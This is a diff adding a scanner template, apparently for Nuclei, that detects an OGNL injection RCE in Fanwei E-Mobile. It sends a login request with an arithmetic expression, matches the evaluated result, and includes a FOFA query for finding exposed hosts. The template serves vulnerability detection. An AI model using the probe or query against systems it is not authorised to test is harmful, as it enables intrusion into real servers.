@@ -1,0 +1,26 @@
+id: fanwei-e-mobile-ognl-rce
+
+info:
+  name: Fanwei E-Mobile RCE
+  author: zp857
+  severity: high
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/qqm4xd
+  tags: fanwei-e-mobile,rce
+  metadata:
+    fofa-query: 'body="E-mobile" || body="e-mobile" || body="E-Mobile"'
+
+requests:
+  - raw:
+      - |
+        GET /login.do?message=857859-2&verify= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "857857"
+
+      - type: status
+        status:
+          - 200
